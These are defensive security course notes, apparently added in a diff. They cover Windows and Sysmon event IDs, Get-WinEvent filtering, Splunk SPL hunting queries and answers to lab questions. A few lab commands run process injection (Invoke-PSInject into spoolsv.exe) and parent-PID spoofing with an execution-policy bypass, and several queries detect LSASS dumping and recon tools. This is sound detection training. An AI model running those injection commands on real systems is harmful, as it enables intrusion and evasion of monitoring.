+<p><strong>Event ID 1120 (Antivirus remediation activity has failed):</strong> This event is the counterpart to 1119 and indicates that the remediation process has failed. These events should be closely monitored and addressed immediately to ensure threats are effectively neutralized.</p>
+<p><strong>Event ID 4624 (Successful Logon):</strong> This event records successful logon events. This information is vital for establishing normal user behavior. Abnormal behavior, such as logon attempts at odd hours or from different locations, could signify a potential security threat.</p>
+<p><strong>Event ID 4625 (Failed Logon):</strong> This event logs failed logon attempts. Multiple failed logon attempts could signify a brute-force attack in progress.</p>
+<p><strong>Event ID 4648 (A logon was attempted using explicit credentials):</strong> This event is triggered when a user logs on with explicit credentials to run a program. Anomalies in these logon events could indicate lateral movement within a network, which is a common technique used by attackers.</p>
+<p><strong>Event ID 4656 (A handle to an object was requested):</strong> This event is triggered when a handle to an object (like a file, registry key, or process) is requested. This can be a useful event for detecting attempts to access sensitive resources.</p>
+<p><strong>Event ID 4672 (Special Privileges Assigned to a New Logon):</strong> This event is logged whenever an account logs on with super user privileges. Tracking these events helps to ensure that super user privileges are not being abused or used maliciously.</p>
+<p><strong>Event ID 4698 (A scheduled task was created):</strong> This event is triggered when a scheduled task is created. Monitoring this event can help you detect persistence mechanisms, as attackers often use scheduled tasks to maintain access and run malicious code.</p>
+<p><strong>Event ID 4700 &amp; Event ID 4701 (A scheduled task was enabled/disabled):</strong> This records the enabling or disabling of a scheduled task. Scheduled tasks are often manipulated by attackers for persistence or to run malicious code, thus these logs can provide valuable insight into suspicious activities.</p>
+<p><strong>Event ID 4702 (A scheduled task was updated):</strong> Similar to 4698, this event is triggered when a scheduled task is updated. Monitoring these updates can help detect changes that may signify malicious intent.</p>
+<p><strong>Event ID 4719 (System audit policy was changed):</strong> This event records changes to the audit policy on a computer. It could be a sign that someone is trying to cover their tracks by turning off auditing or changing what events get audited.</p>
+<p><strong>Event ID 4738 (A user account was changed):</strong> This event records any changes made to user accounts, including changes to privileges, group memberships, and account settings. Unexpected account changes can be a sign of account takeover or insider threats.</p>
+<p><strong>Event ID 4771 (Kerberos pre-authentication failed):</strong> This event is similar to 4625 (failed logon) but specifically for Kerberos authentication. An unusual amount of these logs could indicate an attacker attempting to brute force your Kerberos service.</p>
+<p><strong>Event ID 4776 (The domain controller attempted to validate the credentials for an account):</strong> This event helps track both successful and failed attempts at credential validation by the domain controller. Multiple failures could suggest a brute-force attack.</p>
+<p><strong>Event ID 5001 (Antivirus real-time protection configuration has changed):</strong> This event indicates that the real-time protection settings of Defender have been modified. Unauthorized changes could indicate an attempt to disable or undermine the functionality of Defender.</p>
+<p><strong>Event ID 5140 (A network share object was accessed):</strong> This event is logged whenever a network share is accessed. This can be critical in identifying unauthorized access to network shares.</p>
+<p><strong>Event ID 5142 (A network share object was added):</strong> This event signifies the creation of a new network share. Unauthorized network shares could be used to exfiltrate data or spread malware across a network.</p>
+<p><strong>Event ID 5145 (A network share object was checked to see whether client can be granted desired access):</strong> This event indicates that someone attempted to access a network share. Frequent checks of this sort might indicate a user or a malware trying to map out the network shares for future exploits.</p>
+<p><strong>Event ID 5157 (The Windows Filtering Platform has blocked a connection):</strong> This is logged when the Windows Filtering Platform blocks a connection attempt. This can be helpful for identifying malicious traffic on your network.</p>
+<p><strong>Event ID 7045 (A service was installed in the system):</strong> A sudden appearance of unknown services might suggest malware installation, as many types of malware install themselves as services.</p>
+<h1 id="windows-event-logging-basics-exercises">Windows Event Logging Basics exercises</h1>
+<p>Analyze the event with ID 4624, that took place on 8/3/2022 at 10:23:25. Conduct a similar investigation as outlined in this section and provide the name of the executable responsible for the modification of the auditing settings as your answer. Answer format: T_W_____.exe</p>
+<p><img alt="alt text" src="../assets/image.png" /></p>
+<p>The point is to see what changed after the logon. After the successful logon (4624), the user conduct 4907 (Auditing settings on object were changed.)</p>
+<p><img alt="alt text" src="../assets/image1.png" /></p>
+<p><em>Answer:</em> TiWorker.exe</p>
+<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">System monitor event ID</a></p>
+<p>MD5=1F009DE6A013A282D07436241512C056,SHA256=C897C345C3BCF3E96589A0FEEEA8B6D26CF33C091AC3EE2162DD27F8A79C3FF5,IMPHASH=48D15928B7CDAE9E088E08F2C8DE7CFE
+Signed: true</p>
+<pre><code class="language-bash">C:\Tools\Sysmon&gt; sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
+</code></pre>
+<pre><code class="language-xml">&lt;ImageLoad onmatch=&quot;exclude&quot;&gt;
+            &lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
+&lt;/ImageLoad&gt;
+</code></pre>
+<pre><code class="language-bash">C:\Tools\Sysmon&gt; sysmon.exe -c sysmonconfig-export.xml
+</code></pre>
+<p><a href="https://processhacker.sourceforge.io/">ProcessHacker</a></p>
+<pre><code class="language-powershell">powershell -ep bypass
+Import-Module .\Invoke-PSInject.ps1
+Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode &quot;V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi&quot;
+</code></pre>
+<pre><code class="language-bash">PS C:\Tools\psgetsystem&gt; powershell -ep bypass
+PS C:\Tools\psgetsystem&gt; Import-Module .\psgetsys.ps1 
+PS C:\Tools\psgetsystem&gt; [MyProcess]::CreateProcessFromParent([Process ID of spoolsv.exe],&quot;C:\Windows\System32\cmd.exe&quot;,&quot;&quot;)
+
+c:\Tools\SilkETW_SilkService_v8\v8\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json
+
+PS C:\Tools\GhostPack Compiled Binaries&gt;.\Seatbelt.exe TokenPrivileges
+
+c:\Tools\SilkETW_SilkService_v8\v8\SilkETW&gt;SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json
+</code></pre>
+<pre><code class="language-bash">PS C:\Users\Administrator&gt; Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize
+
+PS C:\Users\Administrator&gt; Get-WinEvent -ListProvider * | Format-Table -AutoSize
+
+# Retrieving events from the System log
+PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'System' -MaxEvents 50 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+# Retrieving events from Microsoft-Windows-WinRM/Operational
+PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+# Retrieving events from .evtx Files
+PS C:\Users\Administrator&gt; Get-WinEvent -Path 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+# Filtering events with FilterHashtable
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{Path='C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+# get event logs based on a date range (5/28/23 - 6/2/2023)
+PS C:\Users\Administrator&gt; $startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
+PS C:\Users\Administrator&gt; $endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+# Filtering events with FilterHashtable &amp; XML
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
+`ForEach-Object {
+$xml = [xml]$_.ToXml()
+$eventData = $xml.Event.EventData.Data
+New-Object PSObject -Property @{
+    SourceIP = $eventData | Where-Object {$_.Name -eq &quot;SourceIp&quot;} | Select-Object -ExpandProperty '#text'
+    DestinationIP = $eventData | Where-Object {$_.Name -eq &quot;DestinationIp&quot;} | Select-Object -ExpandProperty '#text'
+    ProcessGuid = $eventData | Where-Object {$_.Name -eq &quot;ProcessGuid&quot;} | Select-Object -ExpandProperty '#text'
+    ProcessId = $eventData | Where-Object {$_.Name -eq &quot;ProcessId&quot;} | Select-Object -ExpandProperty '#text'
+}
+}  | Where-Object {$_.DestinationIP -eq &quot;52.113.194.132&quot;}
+
+PS C:\Users\Administrator&gt; $Query = @&quot;
+    &lt;QueryList&gt;
+        &lt;Query Id=&quot;0&quot;&gt;
+            &lt;Select Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt;*[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]
+            &lt;/Select&gt;
+        &lt;/Query&gt;
+    &lt;/QueryList&gt;
+    &quot;@
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterXml $Query | ForEach-Object {Write-Host $_.Message `n}
+
+# Filtering events with FilterXPath
+PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath &quot;*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and *[EventData[Data[@Name='CommandLine']='`&quot;C:\Windows\system32\reg.exe`&quot; ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]&quot; | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize
+
+PS C:\Users\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath &quot;*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]&quot;
+
+# Filtering events based on property values
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 | Select-Object -Property *
+
+PS C:\Users\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties[21].Value -like &quot;*-enc*&quot;} | Format-List
+</code></pre>
+<pre><code class="language-bash">Get-WinEvent -FilterHashtable @{Path='C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Lateral Movement\*.evtx'} | Where-Object{$_.Message -like &quot;*\\*\PRINT*&quot;}  | Format-Table -AutoSize
+
+\\*\PRINT
+
+Get-WinEvent Microsoft-Windows-WLAN-AutoConfig/Operational | Where-Object{$_.Message -like &quot;*$SearchString*&quot;}    
+</code></pre>
+<p><img alt="alt text" src="../assets/image2.png" />
+12:30:30</p>
+<h2 id="skill-assessment">Skill assessment</h2>
+<p><strong>Q1:</strong> By examining the logs located in the "C:\Logs\DLLHijack" directory, determine the process responsible for executing a DLL hijacking attack. Enter the process name as your answer. Answer format: _.exe</p>
+<ol>
+<li>
+<p>modify the sysmonconfig file with this changes (Imageload Onmatch = exclusive )
+Update it in cmd with (sysmon.exe -c ….)</p>
+</li>
+<li>
+<p>open Event viewer and open saved logs. Filter event id equals 7 and search for 'wininet.dll'. </p>
+</li>
+</ol>
+<p><strong>Q2:</strong> By examining the logs located in the "C:\Logs\PowershellExec" directory, determine the process that <strong>executed</strong> unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p>
+<ol>
+<li>
+<p>correctly configure the sysmon. and open saved logs in Event viewer</p>
+</li>
+<li>
+<p>Filter event id 7 and search 'wininet.dll' or 'clr.dll' or 'clrjit.dll' and see if anything process is weird. Or search '.Net'</p>
+</li>
+</ol>
+<p><strong>Q3:</strong> By examining the logs located in the "C:\Logs\PowershellExec" directory, determine the process that <strong>injected</strong> into the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p>
+<p>In Q2 we know the process id is 3776, we need to find its parent process. Who create this thread.</p>
+<pre><code>In the Sysmon event ID 8 (CreateRemoteThread), a log is generated when a process creates a thread in another process by using the CreateRemoteThread function. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process.
+</code></pre>
+<p>So, filter event id 8 and find the TargetProcessId: 3776.</p>
+<p><strong>Q4:</strong> By examining the logs located in the "C:\Logs\Dump" directory, determine the process that performed an LSASS dump. Enter the process name as your answer. Answer format: _.exe</p>
+<pre><code class="language-xml"># event id is 10
+&lt;ProcessAccess onmatch=&quot;exclude&quot;&gt;
+            &lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
+&lt;/ProcessAccess&gt;
+</code></pre>
+<p>Filter event id 10 and search 'lsass.exe', trying every exe file that looks malicious.</p>
+<p>processhacker.exe</p>
+<p><strong>Q5:</strong> By examining the logs located in the "C:\Logs\Dump" directory, determine if an ill-intended login took place after the LSASS dump. Answer format: Yes or No</p>
+<p>No</p>
+<p><strong>Q6:</strong> By examining the logs located in the "C:\Logs\StrangePPID" directory, determine a process that was used to temporarily execute code based on a strange parent-child relationship. Enter the process name as your answer. Answer format: _.exe</p>
+<p>SourceImage: C:\Windows\System32\svchost.exe
+TargetProcessGUID: {67e39d39-f935-6269-8203-000000000300}
+TargetProcessId: 7780
+TargetImage: C:\Windows\System32\werfault.exe</p>
+<h1 id="hunting-for-stuxbot">Hunting For Stuxbot</h1>
+<p><strong>Q3:</strong></p>
+<p><code>powershell.file.script_block_text : P*V*</code></p>
+<p><img alt="alt text" src="../assets/image3.png" /></p>
+<h2 id="hunting-for-stuxbot-round-2">Hunting For Stuxbot (Round 2)</h2>
+<p><strong>Q1:</strong></p>
+<p><code>"C:\Users\Public*" and event.code: 11</code></p>
+<p>Sysmon id 11: FileCreate, Event ID 11 contains details about the file's path, the operation that created or modified the file, and the file's hash.</p>
+<p><strong>Q2:</strong></p>
+<p><code>event.code:13 AND registry.path: *Run*</code></p>
+<p>Sysmon Event ID 13 - RegistryEvent (Value Set)</p>
+<p>This Registry event type identifies Registry value modifications. The event records the value written for Registry values of type DWORD and QWORD .</p>
+<p><strong>Q3:</strong></p>
+<p><code>powershell.file.script_block_text: *Enter-PSSession* and event.code:4104</code></p>
+<p>Event 4104 will capture PowerShell commands and show script block logging. A great indicator that PowerShell was executed is Event ID 400. PowerShell's Event ID 400 will detail when the EngineState has started. You may also be wondering how we can correlate an Event ID 400 with an Event ID 4103.</p>
+<h1 id="understanding-log-sources-investigating-with-splunk">Understanding Log Sources &amp; Investigating with Splunk</h1>
+<p><code>search index="main" "UNKNOWN"</code></p>
+<p>UNKNOWN is used as a keyword to filter and retrieve events that include this specific term.</p>
+<p><code>index="main" "*UNKNOWN*"</code></p>
+<p><code>index="main" EventCode!=1</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | fields - User</code></p>
+<p>the fields command excludes the User field from the search results. </p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | table _time, host, Image</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rename Image as Process</code></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | dedup Image</code></p>
+<p>The 'dedup' command removes duplicate events. </p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | sort - _time</code></p>
+<p>the most recent events are shown first.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | stats count by _time, Image</code></p>
+<p>The stats command performs statistical operations. </p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | chart count by _time, Image</code></p>
+<p>The chart command creates a data visualization based on statistical operations.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval Process_Path=lower(Image)</code></p>
+<p>The eval command creates or redefines fields. This command creates a new field Process_Path which contains the lowercase version of the Image field. It doesn't change the actual Image field, but creates a new field that can be used in subsequent operations or for display purposes.</p>
+<p><code>index="main" EventCode=4662 | rex max_match=0 "[^%](?&lt;guid&gt;{.*})" | table guid</code></p>
+<p>The rex command extracts new fields from existing ones using regular expressions.</p>
+<p><code>rex max_match=0 "[^%](?&lt;guid&gt;{.*})"</code> uses the rex command to extract values matching the pattern from the events' fields. The regex pattern {.*} looks for substrings that begin with { and end with }. The [^%] part ensures that the match does not begin with a % character. The captured value within the curly braces is assigned to the named capture group guid.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rex field=Image "(?P&lt;filename&gt;[^\\\]+)$" | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware</code></p>
+<p>The lookup command enriches the data with external sources.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval filename=mvdedup(split(Image, "\\")) | eval filename=mvindex(filename, -1) | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware | dedup filename, is_malware</code></p>
+<p><code>| inputlookup malware_lookup.csv</code></p>
+<p>The inputlookup command retrieves data from a lookup file without joining it to the search results.</p>
+<p><code>index="main" earliest=-7d EventCode!=1</code></p>
+<p>Every event in Splunk has a timestamp. Using the time range picker or the earliest and latest commands, you can limit searches to specific time periods.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" (EventCode=1 OR EventCode=3) | transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m | table Image |  dedup Image</code></p>
+<p>The transaction command is used in Splunk to group events that share common characteristics into transactions, often used to track sessions or user activities that span across multiple events.</p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 NOT [ search index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | top limit=100 Image | fields Image ] | table _time, Image, CommandLine, User, ComputerName</code></p>
+<p>A subsearch in Splunk is a search that is nested inside another search. It's used to compute a set of results that are then used in the outer search.</p>
+<h2 id="spl">SPL</h2>
+<p><code>| eventcount summarize=false index=* | table index</code></p>
+<p>This query uses eventcount to count events in all indexes, then summarize=false is used to display counts for each index separately, and finally, the table command is used to present the data in tabular form.</p>
+<p><code>| metadata type=sourcetypes</code></p>
+<p>This search uses the metadata command, which provides us with various statistics about specified indexed fields. Here, we're focusing on sourcetypes. The result is a list of all sourcetypes in our Splunk environment, along with additional metadata such as the first time a source type was seen (firstTime), the last time it was seen (lastTime), and the number of hosts (totalCount).</p>
+<p>For a simpler view, we can use the following search.</p>
+<p><code>| metadata type=sourcetypes index=* | table sourcetype</code></p>
+<p><code>| metadata type=sources index=* | table source</code></p>
+<p>This command returns a list of all data sources in the Splunk environment.</p>
+<p><code>sourcetype="WinEventLog:Security" | table _raw</code></p>
+<p><code>sourcetype="WinEventLog:Security" | table *</code></p>
+<p>The use of table * can result in a very wide table if our events have a large number of fields.</p>
+<p><code>sourcetype="WinEventLog:Security" | fields Account_Name, EventCode | table Account_Name, EventCode</code></p>
+<p><code>sourcetype="WinEventLog:Security" | fieldsummary</code></p>
+<p>The values provided by the fieldsummary command are calculated based on the events returned by our search.</p>
+<p><code>index=* sourcetype=* | bucket _time span=1d | stats count by _time, index, sourcetype | sort - _time</code></p>
+<p>bucket command is used to group the events based on the _time field into 1-day buckets.</p>
+<p><code>index=* sourcetype=* | rare limit=10 index, sourcetype</code></p>
+<p>The rare command can help us identify uncommon event types, which might be indicative of abnormal behavior. </p>
+<p><code>index="main" | rare limit=20 useother=f ParentImage</code></p>
+<p>This command displays the 20 least common values of the ParentImage field.</p>
+<p><code>index=* sourcetype=* | fieldsummary | where count &lt; 100 | table field, count, distinct_count</code></p>
+<p>This search shows a summary of all fields (fieldsummary), filters out fields that appear in less than 100 events (where count &lt; 100), and then displays a table (table) showing the field name, total count, and distinct count.</p>
+<p><code>index=* | sistats count by index, sourcetype, source, host</code></p>
+<h2 id="introduction-to-splunk-spl">Introduction To Splunk &amp; SPL</h2>
+<p><strong>Q1:</strong></p>
+<p><code>sourcetype="WinEventLog:Security" EventCode=4768 | sistats count by Account_Name</code></p>
+<p>The event code for a Kerberos authentication ticket request is 4768</p>
+<p><img alt="alt text" src="../assets/image4.png" /></p>
+<p><strong>Q2:</strong></p>
+<p><code>sourcetype="WinEventLog:Security" EventCode=4624 Account_Name=SYSTEM | sistats count by ComputerName</code></p>
+<p><img alt="alt text" src="../assets/image5.png" /></p>
+<p><strong>Q3:</strong></p>
+<p><code>sourcetype="WinEventLog:Security" EventCode=4624 | stats earliest(_time) as first_login latest(_time) as last_login count as total_attempts by Account_Name | eval duration = last_login - first_login | where duration &lt;= 600 | sort - total_attempts | head 1 | fields Account_Name, total_attempts, duration</code></p>
+<p><img alt="alt text" src="../assets/image6.png" /></p>
+<h2 id="using-splunk-applications">Using Splunk Applications</h2>
+<p><strong>Q2:</strong></p>
+<p><code>index=* sourcetype="wineventlog:sysmon" EventCode=3 Image="*SharpHound.exe" | stats count</code></p>
+<h2 id="intrusion-detection-with-splunk-real-world-scenario">Intrusion Detection With Splunk (Real-world Scenario)</h2>
+<pre><code>index=&quot;main&quot; earliest=0
+
+index=&quot;main&quot; | stats count by sourcetype
+
+index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot;
+
+index=&quot;main&quot; uniwaldo.local
+
+index=&quot;main&quot; *uniwaldo.local*
+
+index=&quot;main&quot; ComputerName=&quot;*uniwaldo.local&quot;
+
+index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; | stats count by EventCode
+</code></pre>
+<p><strong>Sysmon Event ID 1</strong> - Process Creation: Useful for hunts targeting abnormal parent-child process hierarchies, as illustrated in the first lesson with Process Hacker. It's an event we can use later.</p>
+<p><strong>Sysmon Event ID 2</strong> - A process changed a file creation time: Helpful in spotting "time stomp" attacks, where attackers alter file creation times. Bear in mind, not all such actions signal malicious intent.</p>
+<p><strong>Sysmon Event ID 3</strong> - Network connection: A source of abundant noise since machines are perpetually establishing network connections. We may uncover anomalies, but let's consider other quieter areas first.</p>
+<p><strong>Sysmon Event ID 4</strong> - Sysmon service state changed: Could be a useful hunt if attackers attempt to stop Sysmon, though the majority of these events are likely benign and informational, considering Sysmon's frequent legitimate starts and stops.</p>
+<p><strong>Sysmon Event ID 5</strong> - Process terminated: This might aid us in detecting when attackers kill key processes or use sacrificial ones. For instance, Cobalt Strike often spawns temporary processes like werfault, the termination of which would be logged here, as well as the creation in ID 1.</p>
+<p><strong>Sysmon Event ID 6</strong> - Driver loaded: A potential flag for BYOD (bring your own driver) attacks, though this is less common. Before diving deep into this, let's weed out more conspicuous threats first.</p>
+<p><strong>Sysmon Event ID 7</strong> - Image loaded: Allows us to track dll loads, which is handy in detecting DLL hijacks.</p>
+<p><strong>Sysmon Event ID 8</strong> - CreateRemoteThread: Potentially aids in identifying injected threads. While remote threads can be created legitimately, if an attacker misuses this API, we can potentially trace their rogue process and what they injected into.</p>
+<p><strong>Sysmon Event ID 10</strong> - ProcessAccess: Useful for spotting remote code injection and memory dumping, as it records when handles on processes are made.</p>
+<p><strong>Sysmon Event ID 11</strong> - FileCreate: With many files being created frequently due to updates, downloads, etc., it might be challenging to aim our hunt directly here. However, these events can be beneficial in correlating or identifying a file's origins later.</p>
+<p><strong>Sysmon Event ID 12</strong> - RegistryEvent (Object create and delete) &amp; <strong>Sysmon Event ID 13</strong> - RegistryEvent (Value Set): While numerous events take place here, many registry events can be malicious, and with a good idea of what to look for, hunting here can be fruitful.</p>
+<p><strong>Sysmon Event ID 15</strong> - FileCreateStreamHash: Relates to file streams and the "Mark of the Web" pertaining to external downloads, but we'll leave this aside for now.</p>
+<p><strong>Sysmon Event ID 16</strong> - Sysmon config state changed: Logs alterations in Sysmon configuration, useful for spotting tampering.</p>
+<p><strong>Sysmon Event ID 17</strong> - Pipe created &amp; <strong>Sysmon Event ID 18</strong> - Pipe connected: Record pipe creations and connections. They can help observe malware's interprocess communication attempts, usage of PsExec, and SMB lateral movement.</p>
+<p><strong>Sysmon Event ID 22</strong> - DNSEvent: Tracks DNS queries, which can be beneficial for monitoring beacon resolutions and DNS beacons.</p>
+<p><strong>Sysmon Event ID 23</strong> - FileDelete: Monitors file deletions, which can provide insights into whether a threat actor cleaned up their malware, deleted crucial files, or possibly attempted a ransomware attack.</p>
+<p><strong>Sysmon Event ID 25</strong> - ProcessTampering (Process image change): Alerts on behaviors such as process herpadering, acting as a mini AV alert filter.</p>
+<pre><code>index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 | stats count by ParentImage, Image
+
+index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 (Image=&quot;*cmd.exe&quot; OR Image=&quot;*powershell.exe&quot;) | stats count by ParentImage, Image
+
+index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 (Image=&quot;*cmd.exe&quot; OR Image=&quot;*powershell.exe&quot;) ParentImage=&quot;C:\\Windows\\System32\\notepad.exe&quot;
+
+index=&quot;main&quot; 10.0.0.229 | stats count by sourcetype
+
+index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;linux:syslog&quot;
+
+index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;WinEventLog:sysmon&quot; | stats count by CommandLine
+
+index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;WinEventLog:sysmon&quot; | stats count by CommandLine, host
+
+index=&quot;main&quot; EventCode=4662 Access_Mask=0x100 Account_Name!=*$
+
+index=&quot;main&quot; EventCode=10 lsass | stats count by SourceImage
+
+index=&quot;main&quot; EventCode=10 lsass SourceImage=&quot;C:\\Windows\\System32\\notepad.exe&quot;
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | stats count by EventCode
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | stats count by SourceImage
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | where SourceImage!=TargetImage | stats count by SourceImage
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* | where SourceImage!=TargetImage | stats count by SourceImage
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* | where SourceImage!=TargetImage | stats count by SourceImage
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=&quot;C:\\Windows\\Explorer.EXE&quot; | where SourceImage!=TargetImage | stats count by SourceImage
+
+index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=&quot;C:\\Windows\\Explorer.EXE&quot; | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrace
+</code></pre>
+<p><strong>Q1:</strong></p>
+<p><code>index="main" EventCode=10 lsass | stats count by SourceImage</code></p>
+<p>rundll32.exe</p>
+<p><strong>Q2:</strong></p>
+<p><code>index="main" EventCode=10 lsass SourceImage="C:\\Windows\\System32\\rundll32.exe" | stats count by CallTrace</code></p>
+<p><img alt="alt text" src="../assets/image7.png" /></p>
+<p>comsvcs.dll</p>
+<p><strong>Q3:</strong></p>
+<p><code>index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*clr.dll* CallTrace!=*ni.dll* | where SourceImage!=TargetImage | stats count by SourceImage</code></p>
+<p>rundll32.exe</p>
+<p><strong>Q4:</strong></p>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 Image="C:\\Windows\\System32\\rundll32.exe" DestinationIp="*" | rex field=DestinationIp "10\\.0\\.0\\.(?&lt;octet&gt;\\d{1,3})" | search (octet&gt;=0 AND octet&lt;=99) OR (octet&gt;=100 AND octet&lt;=199) | stats values(DestinationIp) as destination_ips</code></p>
+<p><img alt="alt text" src="../assets/image8.png" /></p>
+<p>10.0.0.186 and 10.0.0.91</p>
+<p><strong>Q5:</strong></p>
+<p><code>index=main EventCode=3 (SourceIp="10.0.0.186" OR SourceIp="10.0.0.91") DestinationPort="*" | stats values(DestinationPort) as destination_ports</code></p>
+<p><code>index=main EventCode=3 (SourceIp="10.0.0.186" OR SourceIp="10.0.0.91") | stats count by DestinationPort</code></p>
+<h2 id="detecting-attacker-behavior-with-splunk-based-on-ttps">Detecting Attacker Behavior With Splunk Based On TTPs</h2>
+<ol>
+<li>Example: Detection Of Reconnaissance Activities Leveraging Native Windows Binaries</li>
+</ol>
+<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\\ipconfig.exe OR Image=*\\net.exe OR Image=*\\whoami.exe OR Image=*\\netstat.exe OR Image=*\\nbtstat.exe OR Image=*\\hostname.exe OR Image=*\\tasklist.exe | stats count by Image,CommandLine | sort - count</code></p>
+<ol>
+<li>Example: Detection Of Requesting Malicious Payloads/Tools Hosted On Reputable/Whitelisted Domains (Such As githubusercontent.com)</li>
+</ol>
